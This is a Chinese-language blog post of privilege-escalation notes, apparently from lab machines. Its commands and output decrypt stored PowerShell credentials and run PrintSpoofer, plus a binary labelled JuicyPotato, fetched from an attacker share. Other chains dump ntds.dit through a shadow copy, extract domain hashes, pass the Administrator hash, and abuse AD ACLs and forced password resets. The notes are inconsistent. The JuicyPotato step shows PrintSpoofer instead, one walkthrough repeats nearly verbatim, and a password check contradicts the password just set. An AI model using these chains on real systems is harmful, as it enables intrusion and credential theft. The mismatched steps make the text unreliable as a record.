---
title: Windows 提权专区
date: 2026-03-02T14:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - 枚举
  - WriteOwner
  - WriteDacl
  - PrintSpoofer
  - JuciePotato
  - Windows
  - ForceChangePassword
  - SeBackupPrivilege
is_long: true
---
## 枚举

### systeminfo

```bash
c:\windows\system32\inetsrv>systeminfo
systeminfo

Host Name:                 JSON
OS Name:                   Microsoft Windows Server 2012 R2 Datacenter
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-80005-00001-AA602
Original Install Date:     5/22/2019, 4:27:16 PM
System Boot Time:          3/1/2026, 8:27:41 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              es-mx;Spanish (Mexico)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     8,191 MB
Available Physical Memory: 7,535 MB
Virtual Memory: Max Size:  9,471 MB
Virtual Memory: Available: 8,808 MB
Virtual Memory: In Use:    663 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.10.2
                                 IP address(es)
                                 [01]: 10.129.227.191
                                 [02]: fe80::f19f:1378:66b2:439f
                                 [03]: dead:beef::f19f:1378:66b2:439f
                                 [04]: dead:beef::4f
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

- OS Name：系统版本
- OS Version：内核版本
- Hotfix(s)：补丁安装情况

### Tasklist

查看 PID。

```bash
C:\Windows\system32>tasklist | findstr 612
tasklist | findstr 612
FileZilla Server.exe           612 Services                   0     10,432 K
```

### Whoami /priv

枚举当前用户权限。

```bash
c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

### Net user

```bash
net user enil
```

### 寻找 `Users` `flag`

```bash
gci C:\Users\ -Filter *.txt -File -Recurse
```

### 读取 xml。

在 `sfitz` 的 `Document` 中发现文件 `connection.xml`。

`cred.xml` 不是普通加密后无法恢复的文件，而是由当前用户上下文导出的 PowerShell 凭据对象，
流程如下，假设用户为 `Enil`：

1. Enil 使用 Export-Clixml 导出 PSCredential
2. 用户名明文保存：`Hernandez/Enil`，密码以 SecureString / DPAPI Blob 形式保存
3. 在 Enil 的会话、以 Enil 的用户执行 PowerShell
4. Import-Clixml 调用 Windows DPAPI 解开用户可解密的数据
5. GetNetworkCredential().Password 将 SecureString 转换明文
6. 得到 Enil 的密码

```bash
PS C:\Users\sfitz\Documents> cat connection.xml
cat connection.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">alaading</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
    </Props>
  </Obj>
</Objs>
```

读取密码。

```bash
PS C:\Users\sfitz\Documents> $cred = import-clixml -Path connection.xml
$cred = import-clixml -Path connection.xml
PS C:\Users\sfitz\Documents> $cred.GetNetworkCredential().UserName
$cred.GetNetworkCredential().UserName
alaading
PS C:\Users\sfitz\Documents> $cred.GetNetworkCredential().Password
$cred.GetNetworkCredential().Password
f8gQ8fynP44ek1m3
```

也可以像下面这样一句话解决。

```bash
C:\Windows\system32>powershell -c "$cred=Import-Clixml C:\Users\nico\Desktop\cred.xml;$cred.GetNetworkCredential().Password"
powershell -c "$cred=Import-Clixml C:\Users\nico\Desktop\cred.xml;$cred.GetNetworkCredential().Password"
1ts-mag1c!!!
```

方法二

这个方法的核心流程如下：

1. 加密时：Enil 用户 + 本机 DPAPI 密钥
2. 得到密文 `0100...`
3. 仍以 Enil 用户在同一台主机执行 ConvertTo-SecureString
4. Windows DPAPI 能找到对应密钥并解密
5. 得到 SecureString
6. GetNetworkCredential().Password 转换为明文

```bash
PS C:\Users\sfitz\Documents> $pass = '01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6' | ConvertTo-SecureString
$pass = '01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6' | ConvertTo-SecureString
PS C:\Users\sfitz\Documents> $cred = New-Object System.Management.Automation.PSCredential('alaading',$pass)
$cred = New-Object System.Management.Automation.PSCredential('alaading',$pass)
PS C:\Users\sfitz\Documents> $cred.GetNetworkCredential() | fl
$cred.GetNetworkCredential() | fl


UserName       : alaading
Password       : f8gQ8fynP44ek1m3
SecurePassword : System.Security.SecureString
Domain         : 
```

## Print 系列漏洞

1. PrintNIghtmare
	- 滥用权限：SeLoadDriverPrivilege（特定情况），或者远程执行无需特殊权限
	- 描述：PrintNightmare 是一种漏洞，编号为 CVE-2021-34527，它影响了 Windows 的 `PrintSpooler` 服务，允许攻击者远程执行代码或者提升本地权限。虽然有些场景下需要 `SeloadDriverPrivilege` 来加载恶意驱动，但更多的时候是无权限限制的远程代码执行漏洞。
2. PrintSpoofer
	- 滥用的权限：SelmpersonatePrivilege
	- 描述：PrintSpoofer 利用了  `Print Spooler` 服务中的漏洞，同样滥用 `SeImpersonatePrivilege`。该工具通过 `Impersonation` 提权，攻击者可以从低权限提高至 SYSTEM。
3. PrintDemon
	- 滥用的权限：本地权限提升
	- 描述：PrintDemon（CVE-2020-1048）是一个 Windows 打印服务中的本地提权漏洞。它允许攻击者将恶意文件写入系统目录，从而实现代码执行或提权，此漏洞影响 Windows Print Spooler，攻击者可以通过操控打印队列中的临时文件来执行恶意操作。
4. CVE-2021-1675
	- 滥用的权限：本地权限提升、远程代码执行
	- 描述：这是 PrintNightmare 另一个变体，攻击者通过 `Print Spooler` 服务在没有特别权限的情况下执行任意代码。
5. MS-RPRN
	- 滥用的权限：远程代码执行
	- 描述：MS-RPRN 是 Windows 中的远程打印协议，该漏洞用于横向移动或远程代码执行。

## 土豆系列漏洞

1. Rotten Potato
	- 滥用的权限：SeImpersonatePribilege
	- 描述：Rotten Potato 利用了 Windows 中的 NTLM Relay 攻击，通过滥用具有 `SeImpersonatePribilege` 权限的进程来获取 SYSTEM 权限。
2. Jucie Potato
	- 滥用的权限：SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege
3. Rogue Potato
	- 滥用的权限 ：SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege
4. Sweet Potato
	- 滥用的权限：SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege
5. Potato.exe
	- 滥用的权限：SeImpersonatePrivilege
6. Smail Potato
	- 滥用的权限：SeImpersonatePrivilege
7. Ghost Potato
	- 滥用的权限：SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege

## 提权演示

### PrintSpoofer

将 PrintSpoofer 传进靶机。

```bash
c:\windows\system32\inetsrv>cd c:\programdata
cd c:\programdata

c:\ProgramData>mkdir apps
mkdir apps

c:\ProgramData>cd apps
cd apps

c:\ProgramData\apps>copy \\10.10.16.155\Enil\PrintSpoofer64.exe .\PrintSpoofer64.exe
copy \\10.10.16.155\Enil\PrintSpoofer64.exe .\PrintSpoofer64.exe
        1 file(s) copied.

c:\ProgramData\apps>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AEF2-0DF2

 Directory of c:\ProgramData\apps

03/02/2026  03:00 AM    <DIR>          .
03/02/2026  03:00 AM    <DIR>          ..
03/02/2026  02:55 AM            27,136 PrintSpoofer64.exe
               1 File(s)         27,136 bytes
               2 Dir(s)   4,617,351,168 bytes free
```

尝试执行提权。

```bash
c:\ProgramData\apps>PrintSpoofer64.exe -i -c cmd.exe
PrintSpoofer64.exe -i -c cmd.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

### JuciePotato

将 JuicyPotato.exe 传入靶机。

```bash
c:\ProgramData\apps>copy \\10.10.16.155\Enil\JuicyPotato.exe .\JuicyPotato.exe
copy \\10.10.16.155\Enil\JuicyPotato.exe .\JuicyPotato.exe
        1 file(s) copied.

c:\ProgramData\apps>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AEF2-0DF2

 Directory of c:\ProgramData\apps

03/02/2026  03:40 AM    <DIR>          .
03/02/2026  03:40 AM    <DIR>          ..
12/06/2021  06:35 PM           347,648 JuicyPotato.exe
03/02/2026  02:55 AM            27,136 PrintSpoofer64.exe
               2 File(s)        374,784 bytes
               2 Dir(s)   4,617,109,504 bytes free
```

利用提权。

```bash
c:\ProgramData\apps>PrintSpoofer64.exe -i -c cmd.exe
PrintSpoofer64.exe -i -c cmd.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

### SeBackupPrivilege

查看一下权限，发现有 SeBackupPrivilege，可以作为提权的途径。

```bash
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288

```

在 Kali 中制作提权脚本。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ printf 'set context persistent nowriters\r\nadd volume c: alias cdrive\r\ncreate\r\nexpose %%cdrive%% z:\r\n' > dshadow.txt                                                                                
                                                                                                        
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ xxd dshadow.txt 
00000000: 7365 7420 636f 6e74 6578 7420 7065 7273  set context pers
00000010: 6973 7465 6e74 206e 6f77 7269 7465 7273  istent nowriters
00000020: 0d0a 6164 6420 766f 6c75 6d65 2063 3a20  ..add volume c: 
00000030: 616c 6961 7320 6364 7269 7665 0d0a 6372  alias cdrive..cr
00000040: 6561 7465 0d0a 6578 706f 7365 2025 6364  eate..expose %cd
00000050: 7269 7665 2520 7a3a 0d0a                 rive% z:..
```

上传至目标机器，并验证完整性。

挂载。

```bash
*Evil-WinRM* PS C:\programdata\apps> upload dshadow.txt
                                        
Info: Uploading /home/kali/Work/Kali/Blackfield/dshadow.txt to C:\programdata\apps\dshadow.txt
                                        
Data: 120 bytes of 120 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\programdata\apps> Get-Content C:\Users\svc_backup\Desktop\dshadow.txt
set context persistent nowriters
add volume c: alias cdrive
create
expose %cdrive% z:
*Evil-WinRM* PS C:\programdata\apps> Format-Hex C:\Users\svc_backup\Desktop\dshadow.txt


           Path: C:\Users\svc_backup\Desktop\dshadow.txt

           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F

00000000   73 65 74 20 63 6F 6E 74 65 78 74 20 70 65 72 73  set context pers
00000010   69 73 74 65 6E 74 20 6E 6F 77 72 69 74 65 72 73  istent nowriters
00000020   0A 61 64 64 20 76 6F 6C 75 6D 65 20 63 3A 20 61  .add volume c: a
00000030   6C 69 61 73 20 63 64 72 69 76 65 0A 63 72 65 61  lias cdrive.crea
00000040   74 65 0A 65 78 70 6F 73 65 20 25 63 64 72 69 76  te.expose %cdriv
00000050   65 25 20 7A 3A 0D 0A                             e% z:..

```

验证挂载并复制 `ntds.dit` 与 `SYSTEM`。

```bash
*Evil-WinRM* PS C:\programdata\apps> ls Z:\Windows\NTDS
 


    Directory: Z:\Windows\NTDS


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/10/2023   6:29 PM           8192 edb.chk
-a----        4/27/2026  11:02 AM       10485760 edb.log
-a----        2/23/2020   9:41 AM       10485760 edb00004.log
-a----        2/23/2020   9:41 AM       10485760 edb00005.log
-a----        2/23/2020   3:13 AM       10485760 edbres00001.jrs
-a----        2/23/2020   3:13 AM       10485760 edbres00002.jrs
-a----        2/23/2020   9:41 AM       10485760 edbtmp.log
-a----        4/27/2026  10:31 AM       18874368 ntds.dit
-a----        4/27/2026  10:31 AM          16384 ntds.jfm
-a----        4/27/2026  10:31 AM         434176 temp.edb


*Evil-WinRM* PS C:\programdata\apps> mkdir ntds


    Directory: C:\programdata\apps


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        4/27/2026  11:10 AM                ntds


*Evil-WinRM* PS C:\programdata\apps> robocopy /b Z:\Windows\NTDS C:\programdata\apps\ntds ntds.dit

...

*Evil-WinRM* PS C:\programdata\apps> reg save HKLM\SYSTEM C:\programdata\apps\ntds\SYSTEM
The operation completed successfully.

*Evil-WinRM* PS C:\programdata\apps> dir ntds


    Directory: C:\programdata\apps\ntds


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/27/2026  10:31 AM       18874368 ntds.dit
-a----        4/27/2026  11:11 AM       17383424 SYSTEM
```

下载至 kali。

```bash
*Evil-WinRM* PS C:\programdata\apps\ntds> download ntds.dit
                                        
Info: Downloading C:\programdata\apps\ntds\ntds.dit to ntds.dit
                                        
Info: Download successful!
*Evil-WinRM* PS C:\programdata\apps\ntds> download SYSTEM
                                        
Info: Downloading C:\programdata\apps\ntds\SYSTEM to SYSTEM
                                        
Info: Download successful!

```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ ls -liah SYSTEM     
2781608 -rw-rw-r-- 1 kali kali 17M Apr 27 07:24 SYSTEM
                                                                                                                              
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ ls -liha ntds.dit
2792050 -rw-rw-r-- 1 kali kali 18M Apr 27 07:19 ntds.dit
```

使用 secretsdump 爆破 hash。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL | tee HASH.txt
...
...

┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ head -n 10 HASH.txt 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec:::
```

使用 hash 登录 Administrator 得到 root flag。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ evil-winrm -i 10.129.25.101 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
4375a629c7c67c8e29db269060c955cb
```

### WriteOwner

WriteOwner 指有权修改某个对象的所有者（Owner）。

1. 拥有 WriteOwner
2. 把对象 Owner 改成自己或自己控制的账户
3. Owner 天然可以修改对象的 DACL（访问控制列表）
4. 给自己授予更高权限
5. 利用新权限完成提权或横向移动

举个例子，有下面这一条提权链条：

`tom（WriteOwner）` –> `claire（WriteDacl）` –> `Backup_Admins`

在这里 Tom 的 WriteOwner 权限不是直接给 Administrator 提权，而是让 Tom 能控制 `claire` 这个 AD 用户对象，作为后续提权链的第一环。

Tom 可以把 Claire 对象的 Owner 改为 Tom。对应的逻辑如下：

```PowerShell
Set-DomainObjectOwner -Identity claire -OwnerIdentity Tom
```

### WriteDacl

WriteDacl 指可以修改某个对象的权限列表（DACL）。DACL 由一条条 ACE 组成，用来决定 ”谁能对该对象做什么“。拥有 WriteDacl 就能增删或修改这些 ACE。以下面这个提权链为例：

`tom（WriteOwner）` –> `claire（WriteDacl）` –> `Backup_Admins`

给出修改密码的命令如下：

```PowerShell
Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Right ResetPassword
```

```PowerShell
$pass = ConvertTo-SecureString '123456' -AsPlainText -Force
```

其中 `AsPlainText` 表示输入的是明文密码，而不是已经加密的 `SecureString` 数据。

下面是添加权限的命令，修改 `Backup_Admins` 这个组对象的 ACL，给 `claire` 添加 `WriteMembers`。

```PowerShell
Add-DomainObjectAcl -TargetIdentity 'Backup_Admins' -PrincipalIdentity claire -Rights WriteMembers
```

将 `claire` 添加为 `Backup_Admins` 成员。

```PowerShell
Add-DomainGroupMember -Identity "Backup_Admins" -Members claire
```

### ForceChangePassword

使用 rpcclient 连接 support，使用 setuserinfo2 修改 audit2020 的密码为 `123456`

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ rpcclient -U 'BLACKFIELD/support%#00^BlackKnight' 10.129.229.17
rpcclient $> setuserinfo2 audit2020 23 '123456'
```

验证是否修改成功。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ nxc smb 10.129.229.17 -u audit2020 -p 'P@ssword'
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\audit2
```

### SeBackupPrivilege

SeBackupPrivilege 是 Windows 的备份文件和目录特权，启用时可以绕过 NTFS ACL 文件权限检查，读取本来无权读取的敏感文件。

```bash
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```

在 Kali 中制作提权脚本。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ printf 'set context persistent nowriters\r\nadd volume c: alias cdrive\r\ncreate\r\nexpose %%cdrive%% z:\r\n' > dshadow.txt                                                                                
                                                                                                        
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ xxd dshadow.txt 
00000000: 7365 7420 636f 6e74 6578 7420 7065 7273  set context pers
00000010: 6973 7465 6e74 206e 6f77 7269 7465 7273  istent nowriters
00000020: 0d0a 6164 6420 766f 6c75 6d65 2063 3a20  ..add volume c: 
00000030: 616c 6961 7320 6364 7269 7665 0d0a 6372  alias cdrive..cr
00000040: 6561 7465 0d0a 6578 706f 7365 2025 6364  eate..expose %cd
00000050: 7269 7665 2520 7a3a 0d0a                 rive% z:..
```

解释一下这个脚本：

```dshadow.txt
set context persistent nowriters
add volume c: alias cdrive
create
expose %cdrive% z:
```

- `persistent`：让创建的卷影副本在 diskshadow 退出后仍然存在
- `nowriters`：不通知 VSS Writers 去协调程序写入，因此创建的更快，但一致性保障较弱
- `add volume c: alias cdrive`：指定 C 盘创建卷影副本，别名为 cdrive
- `expose %cdrive% z:`：创建 C盘 快照，挂载为` z:` 盘

上传至目标机器，并验证完整性。

挂载。

```bash
*Evil-WinRM* PS C:\programdata\apps> upload dshadow.txt
                                        
Info: Uploading /home/kali/Work/Kali/Blackfield/dshadow.txt to C:\programdata\apps\dshadow.txt
                                        
Data: 120 bytes of 120 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\programdata\apps> Get-Content C:\Users\svc_backup\Desktop\dshadow.txt
set context persistent nowriters
add volume c: alias cdrive
create
expose %cdrive% z:
*Evil-WinRM* PS C:\programdata\apps> Format-Hex C:\Users\svc_backup\Desktop\dshadow.txt


           Path: C:\Users\svc_backup\Desktop\dshadow.txt

           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F

00000000   73 65 74 20 63 6F 6E 74 65 78 74 20 70 65 72 73  set context pers
00000010   69 73 74 65 6E 74 20 6E 6F 77 72 69 74 65 72 73  istent nowriters
00000020   0A 61 64 64 20 76 6F 6C 75 6D 65 20 63 3A 20 61  .add volume c: a
00000030   6C 69 61 73 20 63 64 72 69 76 65 0A 63 72 65 61  lias cdrive.crea
00000040   74 65 0A 65 78 70 6F 73 65 20 25 63 64 72 69 76  te.expose %cdriv
00000050   65 25 20 7A 3A 0D 0A                             e% z:..
```

验证挂载并复制 `ntds.dit` 与 `SYSTEM`。

```bash
*Evil-WinRM* PS C:\programdata\apps> ls Z:\Windows\NTDS
 


    Directory: Z:\Windows\NTDS


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/10/2023   6:29 PM           8192 edb.chk
-a----        4/27/2026  11:02 AM       10485760 edb.log
-a----        2/23/2020   9:41 AM       10485760 edb00004.log
-a----        2/23/2020   9:41 AM       10485760 edb00005.log
-a----        2/23/2020   3:13 AM       10485760 edbres00001.jrs
-a----        2/23/2020   3:13 AM       10485760 edbres00002.jrs
-a----        2/23/2020   9:41 AM       10485760 edbtmp.log
-a----        4/27/2026  10:31 AM       18874368 ntds.dit
-a----        4/27/2026  10:31 AM          16384 ntds.jfm
-a----        4/27/2026  10:31 AM         434176 temp.edb


*Evil-WinRM* PS C:\programdata\apps> mkdir ntds


    Directory: C:\programdata\apps


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        4/27/2026  11:10 AM                ntds


*Evil-WinRM* PS C:\programdata\apps> robocopy /b Z:\Windows\NTDS C:\programdata\apps\ntds ntds.dit

...

*Evil-WinRM* PS C:\programdata\apps> reg save HKLM\SYSTEM C:\programdata\apps\ntds\SYSTEM
The operation completed successfully.

*Evil-WinRM* PS C:\programdata\apps> dir ntds


    Directory: C:\programdata\apps\ntds


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/27/2026  10:31 AM       18874368 ntds.dit
-a----        4/27/2026  11:11 AM       17383424 SYSTEM
```

下载至 kali。

```bash
*Evil-WinRM* PS C:\programdata\apps\ntds> download ntds.dit
                                        
Info: Downloading C:\programdata\apps\ntds\ntds.dit to ntds.dit
                                        
Info: Download successful!
*Evil-WinRM* PS C:\programdata\apps\ntds> download SYSTEM
                                        
Info: Downloading C:\programdata\apps\ntds\SYSTEM to SYSTEM
                                        
Info: Download successful!
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ ls -liah SYSTEM     
2781608 -rw-rw-r-- 1 kali kali 17M Apr 27 07:24 SYSTEM
                                                                                                                              
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ ls -liha ntds.dit
2792050 -rw-rw-r-- 1 kali kali 18M Apr 27 07:19 ntds.dit
```

使用 secretsdump 爆破 hash。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL | tee HASH.txt
...
...

┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ head -n 10 HASH.txt 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec:::
```

使用 hash 登录 Administrator 得到 root flag。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
└─$ evil-winrm -i 10.129.25.101 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
